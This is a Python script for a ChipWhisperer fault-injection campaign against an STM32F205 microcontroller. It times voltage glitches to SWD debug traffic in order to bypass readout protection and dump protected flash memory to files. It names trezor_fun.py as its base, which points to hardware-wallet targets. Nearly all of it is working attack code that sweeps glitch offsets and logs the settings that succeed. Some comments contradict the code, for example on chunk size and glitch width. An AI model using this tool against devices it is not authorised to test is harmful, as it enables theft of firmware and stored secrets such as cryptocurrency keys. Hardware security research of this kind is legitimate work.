#!/usr/bin/env python3
"""
Memory Read Glitch with NRST Trigger
Based on trezor_fun.py but checks memory read instead of boot mode
"""

import chipwhisperer.common.results.glitch as glitch
import chipwhisperer as cw
from swd import Swd
import time
import os

# Configuration
#FLASH_START = 0x08008000  # Start of flash storage area #1
#FLASH_END = 0x0800BFFF   # End of flash storage area #1
FLASH_START = 0x1FFF7860  # Start of flash storage area #1
FLASH_END = 0x1FFF787F   # End of flash storage area #1
CHUNK_SIZE = 32         # Read 256 bytes at a time
current_address = FLASH_START  # Track current position

def check_existing_dump(address):
    """Check if memory at this address has already been dumped"""
    return False  # Force re-dumping all addresses

def save_memory_chunk(address, data):
    """Save memory chunk to combined flash dump file"""
    # Main combined flash dump file
    combined_file = "FLASH/flash_dump_combined.bin"
    
    # Calculate offset in the file based on address
    offset = address - FLASH_START
    
    # Create file if it doesn't exist
    if not os.path.exists(combined_file):
        # Pre-allocate the full file size with zeros
        with open(combined_file, 'wb') as f:
            f.write(b'\x00' * (FLASH_END - FLASH_START + 1))
    
    # Write data at the correct offset
    with open(combined_file, 'r+b') as f:
        f.seek(offset)
        f.write(data)
        f.flush()
    
    # Save individual file with actual memory data
    marker_file = f"FLASH/0x{address:08X}.done"
    with open(marker_file, 'wb') as f:
        f.write(data)  # Write the actual 256 bytes of memory
    
    return combined_file

def swd_recovery():
    """Perform SWD line recovery after errors"""
    try:
        swd = Swd()
        # Send line reset sequence (50+ clock cycles with SWDIO high)
        # This clears any pending FAULT/WAIT states
        time.sleep(0.001)  # 1ms recovery time
    except:
        pass

def check_memory_read(address=None):
    """Try to read memory - success means RDP was bypassed"""
    global current_address
    if address is None:
        address = current_address

    try:
        swd = Swd()
        data = bytes(swd.read_mem(address, CHUNK_SIZE))
        if len(data) == CHUNK_SIZE:
            # Any successful read is valid - no validation
            print(f"\n💥 SUCCESS! Read {len(data)} bytes from 0x{address:08X}")
            print(f"First 16 bytes: ", end="")
            for i in range(min(16, len(data))):
                print(f"{data[i]:02X} ", end="")
            print()
            return data  # Return the actual data
    except Exception as e:
        # Check if it's a SWD protocol error
        error_str = str(e).lower()
        if 'fault' in error_str or 'wait' in error_str:
            print(f" SWD_{error_str.upper()[:5]}", end="")
            # Perform SWD recovery
            swd_recovery()
        else:
            print(f" NACK", end="")
        pass
    return None  # Return None instead of False

def reset_target():
    """Reset the target device"""
    # TIO3 is now monitoring SWDIO, not used for reset
    # You may need to use another method for reset (e.g., power cycle or nRST pin)
    # Silently reset without printing to avoid scrolling
    time.sleep(1.5)  # Longer reset time to ensure clean SWD state

def arm_glitch():
    """Arm scope for glitch - no reset, just prepare to fire"""
    global scope
    scope.arm()

# Removed - TIO3 now monitors SWDIO instead of being pulsed manually

# Create FLASH folder if it doesn't exist
if not os.path.exists('FLASH'):
    os.makedirs('FLASH')
    print("📁 Created FLASH folder for memory dumps")

# Master log file path
MASTER_LOG = 'FLASH/glitch_master_log.csv'

# Create or append to master log
if not os.path.exists(MASTER_LOG):
    # Create header for new file
    with open(MASTER_LOG, 'w') as f:
        f.write("Timestamp,Address,ExtOffset,Width,Offset,TimeToFind_sec,TotalAttempts,SuccessfulIteration,Timing_us\n")
    print("📝 Created new master log file")
else:
    print(f"📝 Appending to existing master log")

def log_successful_glitch(address, ext_offset, width, offset, time_to_find, attempts, iteration):
    """Append a successful glitch to the master log"""
    with open(MASTER_LOG, 'a') as f:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        timing_us = ext_offset / 100  # Convert to microseconds
        f.write(f"{timestamp},0x{address:08X},{ext_offset},{width},{offset},{time_to_find:.1f},{attempts},{iteration},{timing_us:.1f}\n")
        f.flush()  # Ensure it's written immediately
    # Log message at fixed position
    print(f"\033[12;1H\033[2K📝 Logged to master file", flush=True)

def display_log_summary():
    """Display summary of logged glitches"""
    if os.path.exists(MASTER_LOG):
        print(f"\n📊 Master Log Summary ({MASTER_LOG}):")
        print("="*60)
        with open(MASTER_LOG, 'r') as f:
            lines = f.readlines()
            if len(lines) > 1:  # Skip header
                print(f"Total successful glitches logged: {len(lines)-1}")
                print("\nLast 5 entries:")
                for line in lines[-5:]:
                    if not line.startswith('Timestamp'):
                        parts = line.strip().split(',')
                        if len(parts) >= 9:
                            print(f"  {parts[1]}: ext_offset={parts[2]} ({parts[8]}µs), iter={parts[7]}, time={parts[5]}s")
        print("="*60)

# Connect to ChipWhisperer
print("="*60)
print("STM32F205 Memory Read Glitch Campaign")
print("="*60)

scope = cw.scope()

# Set up scope parameters
scope.clock.clkgen_freq = 100E6
scope.trigger.triggers = 'tio3'  # Trigger on TIO3 rising edge
scope.glitch.clk_src = "clkgen"
scope.glitch.output = "enable_only"
scope.glitch.trigger_src = "ext_single"  # glitch only after scope.arm() called
scope.io.glitch_lp = True
scope.io.glitch_hp = True

# Glitch parameters for SWDIO triggering
g_step = 10  # Steps of 0.1 microseconds
gc = glitch.GlitchController(groups=["success", "failure"], parameters=["width", "offset", "ext_offset"])
gc.set_global_step(g_step)

# Define the ranges - targeting 436µs to 1.126ms
width_min, width_max = 5, 8  # Fixed width
offset_min, offset_max = -10, -10  # Fixed offset
# 620µs = 62000 cycles at 100MHz
#ext_offset_min, ext_offset_max = 62000, 100000  # 620µs to 1ms after SWDIO edge
ext_offset_min, ext_offset_max = 90000, 100000  # 620µs to 1ms after SWDIO edge

# Set the ranges
gc.set_range("width", width_min, width_max)
gc.set_range("offset", offset_min, offset_max)
gc.set_range("ext_offset", ext_offset_min, ext_offset_max)

print(f"\nGlitch Configuration:")
print(f"  Width: {width_min}")
print(f"  Offset: {offset_min} ({offset_min/100:.1f} µs)")
print(f"  Ext_offset: {ext_offset_min} to {ext_offset_max}")
print(f"    Range: {ext_offset_min/100:.1f} µs to {ext_offset_max/100:.1f} µs")
print(f"    Range: {ext_offset_min/100000:.3f} ms to {ext_offset_max/100000:.3f} ms")
print(f"  Trigger: SWDIO activity on TIO3")
print(f"  Step: {g_step} ({g_step/100:.1f} µs)")

scope.glitch.repeat = 5
sample_size = 10 # Attempts per setting

# Configure TIO3 as high-impedance input to monitor SWDIO
print("\n" + "="*60)
print("🔌 CONFIGURING TIO3 FOR SWDIO MONITORING")
print("="*60)
print("\nSetting TIO3 as high-impedance input to monitor SWDIO line...")
scope.io.tio3 = 'high_z'  # High impedance - just listening, not driving
print("✓ TIO3 configured as input!")
print("TIO3 will now trigger on SWDIO activity during memory reads.")

# Test the setup
print("\n" + "="*60)
print("TEST CONFIGURATION")
print("="*60)
print("\nScope will trigger on SWDIO activity detected on TIO3.")
print("Make sure:")
print("  1. TIO3 is connected to SWDIO line")
print("  2. Scope will trigger on SWDIO edges")
print("  3. Glitch will fire after ext_offset from trigger")

print("\n✓ Configuration complete!")
input("Press Enter to start campaign (or Ctrl+C to exit)...")

# Calculate total settings accounting for g_step
# width: 1 value (fixed at 40)
# offset: 1 value (fixed at -45)
# ext_offset: varies based on range and g_step
total_ext_offset_values = ((ext_offset_max - ext_offset_min) // g_step) + 1
total_settings = total_ext_offset_values  # Since width and offset are fixed
# Count already dumped chunks
total_chunks = (FLASH_END - FLASH_START + 1) // CHUNK_SIZE
dumped_chunks = 0
for addr in range(FLASH_START, FLASH_END + 1, CHUNK_SIZE):
    if check_existing_dump(addr):
        dumped_chunks += 1

print(f"\nStarting campaign:")
print(f"  Flash range: 0x{FLASH_START:08X} - 0x{FLASH_END:08X}")
print(f"  Total chunks: {total_chunks}")
print(f"  Already dumped: {dumped_chunks}/{total_chunks} ({dumped_chunks*100/total_chunks:.1f}%)")
print(f"  Sample size: {sample_size} attempts per setting")
print(f"  Ext_offset values to test: {total_ext_offset_values} (step={g_step})")
print(f"  Total settings per address: {total_settings}")
print(f"  Max attempts per address: {total_settings * sample_size}")
print("="*60 + "\n")

from datetime import datetime

total_attempts = 0
ext_offset_index = 0
start_time = datetime.now()

# Check for existing dumps and skip to first missing address
while current_address <= FLASH_END and check_existing_dump(current_address):
    print(f"⚡ Skipping 0x{current_address:08X} - already dumped")
    current_address += CHUNK_SIZE

if current_address > FLASH_END:
    print("\n✅ All flash memory already dumped!")
    exit(0)

# Clear screen for clean display
print("\033[2J\033[H")  # Clear screen and move cursor to top
print("="*60)
print("FLASH DUMP GLITCH CAMPAIGN - SWDIO Triggered")
print("="*60)

# Calculate and display completion time
from datetime import datetime, timedelta
campaign_start_time = datetime.now()
total_time_seconds = total_settings * sample_size * 2.11  # 2.0s + 0.1s + 0.01s per attempt
completion_time = campaign_start_time + timedelta(seconds=total_time_seconds)
print(f"Start: {campaign_start_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
print(f"Est. Completion: {completion_time.strftime('%Y-%m-%d %I:%M:%S %p (%A)')}")
print()

# Main loop - continue until all flash is dumped
while current_address <= FLASH_END:
    # Update status line
    print(f"\033[5;1H\033[2K🎯 Current Target: 0x{current_address:08X} | Total Attempts: {total_attempts}", flush=True)
    print("\033[7;1H", end="")  # Move cursor to line 7 for the rest of output
    
    # Reset device before starting new address (ensures clean state)
    reset_target()
    
    address_found = False
    address_attempts = 0  # Track attempts for this address
    
    for glitch_setting in gc.glitch_values():
        ext_offset_index += 1
        scope.glitch.width = glitch_setting[0]
        scope.glitch.offset = glitch_setting[1]
        scope.glitch.ext_offset = glitch_setting[2]
        
        # Calculate progress
        percent_complete = (ext_offset_index - 1) / total_settings * 100
        
        total_offset = scope.glitch.offset + scope.glitch.ext_offset
        
        # Create progress bar
        bar_length = 30
        filled_length = int(bar_length * percent_complete // 100)
        bar = '█' * filled_length + '░' * (bar_length - filled_length)
        
        # Calculate memory progress
        memory_progress = ((current_address - FLASH_START) / (FLASH_END - FLASH_START + 1)) * 100
        chunks_done = (current_address - FLASH_START) // CHUNK_SIZE
        total_chunks = (FLASH_END - FLASH_START + 1) // CHUNK_SIZE
        
        # Calculate time remaining
        settings_remaining = total_settings - ext_offset_index + 1
        time_remaining_seconds = settings_remaining * sample_size * 2.11
        hours_remaining = int(time_remaining_seconds // 3600)
        minutes_remaining = int((time_remaining_seconds % 3600) // 60)
        new_completion_time = datetime.now() + timedelta(seconds=time_remaining_seconds)
        
        # Update display at fixed positions
        print(f"\033[7;1H\033[2KTesting ext_offset: {scope.glitch.ext_offset} ({scope.glitch.ext_offset/100:.2f} µs)", flush=True)
        print(f"\033[8;1H\033[2K  Address: 0x{current_address:08X} [Chunk {chunks_done+1}/{total_chunks} - {memory_progress:.1f}% of flash]", flush=True)
        print(f"\033[9;1H\033[2K  Progress: [{bar}] {percent_complete:.1f}% - Setting {ext_offset_index}/{total_settings}", flush=True)
        print(f"\033[10;1H\033[2K  Time Remaining: {hours_remaining}h {minutes_remaining}m | Est: {new_completion_time.strftime('%I:%M:%S %p')}", flush=True)
        print("\033[11;1H\033[2K", end="", flush=True)  # Position for attempt line
        
        successes = 0
        
        for i in range(sample_size):
            iteration = i + 1  # Human-readable iteration (1-based)
            
            # Show iteration progress at fixed position
            print(f"\033[11;1H\033[2K  Attempt {iteration:2d}/{sample_size}: ", end="", flush=True)
            
            # Arm scope - it will trigger on SWDIO activity
            arm_glitch()
            
            # Longer delay to ensure scope is ready and SWD is stable
            time.sleep(0.1)
            
            total_attempts += 1
            address_attempts += 1  # Track attempts for this specific address

            # Attempt memory read - SWDIO activity will trigger the glitch
            data = check_memory_read(current_address)
            if data:
                print(" SUCCESS!", flush=True)
                # Show success message at bottom
                print(f"\033[13;1H\033[2K🎉 GLITCH WORKED at 0x{current_address:08X}!", flush=True)
                print(f"\033[14;1H\033[2K   ext_offset={scope.glitch.ext_offset} ({scope.glitch.ext_offset/100:.1f}µs), iteration {iteration}/{sample_size}", flush=True)
                
                # Save the successfully read data
                save_memory_chunk(current_address, data)
                
                # Log to master file
                time_to_find = 0  # Time tracking removed for simplicity
                log_successful_glitch(current_address, scope.glitch.ext_offset, 
                                     scope.glitch.width, scope.glitch.offset,
                                     time_to_find, address_attempts, iteration)
                
                print("🎉"*30)
                successes += 1
                
                # Move to next address
                current_address += CHUNK_SIZE
                
                # Skip any already dumped addresses
                while current_address <= FLASH_END and check_existing_dump(current_address):
                    print(f"⚡ Skipping 0x{current_address:08X} - already dumped")
                    current_address += CHUNK_SIZE
                
                if current_address > FLASH_END:
                    print(f"\033[15;1H\033[2K✨ Reached end of flash memory!", flush=True)
                    break
                else:
                    print(f"\033[15;1H\033[2K➡️ Moving to next address: 0x{current_address:08X}", flush=True)
                    # Reset for next address - restart the glitch search
                    address_found = True
                    break  # Break out of this attempt loop to start fresh for new address
            else:
                print(" Failed    ", flush=True)

            # Delay between glitch attempts to let target stabilize
            time.sleep(2.0)  # Longer delay to let SWD recover completely
                

        # After all attempts for this glitch setting
        if successes > 0:
            print(f"\033[13;1H\033[2K✨ Found working glitch for 0x{current_address-CHUNK_SIZE:08X}!", flush=True)
            print(f"\033[14;1H\033[2K   Success rate: {(successes/sample_size)*100:.1f}%", flush=True)
            address_found = True
            break  # Break out of glitch_setting loop to restart for next address
    
    # If we couldn't find a glitch for this address after trying all settings
    if not address_found:
        print(f"\033[15;1H\033[2K⚠️ Failed to glitch 0x{current_address:08X} after all settings", flush=True)
        print(f"\033[16;1H\033[2KSkipping to next address...", flush=True)
        current_address += CHUNK_SIZE
        
        # Skip any already dumped addresses
        while current_address <= FLASH_END and check_existing_dump(current_address):
            print(f"⚡ Skipping 0x{current_address:08X} - already dumped")
            current_address += CHUNK_SIZE

print("\n" + "="*60)
print("Campaign complete!")
print(f"Total attempts: {total_attempts}")
print(f"Final address reached: 0x{current_address:08X}")
if current_address > FLASH_END:
    print("✅ Successfully dumped entire flash!")
else:
    bytes_dumped = current_address - FLASH_START
    total_bytes = FLASH_END - FLASH_START + 1
    print(f"📊 Dumped {bytes_dumped} / {total_bytes} bytes ({bytes_dumped*100/total_bytes:.1f}%)")

# Show combined file info
combined_file = "FLASH/flash_dump_combined.bin"
if os.path.exists(combined_file):
    file_size = os.path.getsize(combined_file)
    print(f"\n📁 Combined flash dump: {combined_file}")
    print(f"   File size: {file_size:,} bytes ({file_size/1024/1024:.2f} MB)")
    
    # Count how many chunks are non-zero
    with open(combined_file, 'rb') as f:
        dumped_chunks = 0
        for addr in range(FLASH_START, FLASH_END + 1, CHUNK_SIZE):
            offset = addr - FLASH_START
            f.seek(offset)
            chunk = f.read(CHUNK_SIZE)
            if chunk and not all(b == 0x00 for b in chunk):
                dumped_chunks += 1
    
    total_chunks = (FLASH_END - FLASH_START + 1) // CHUNK_SIZE
    print(f"   Chunks with data: {dumped_chunks}/{total_chunks} ({dumped_chunks*100/total_chunks:.1f}%)")

print("="*60)

# Display log summary
display_log_summary()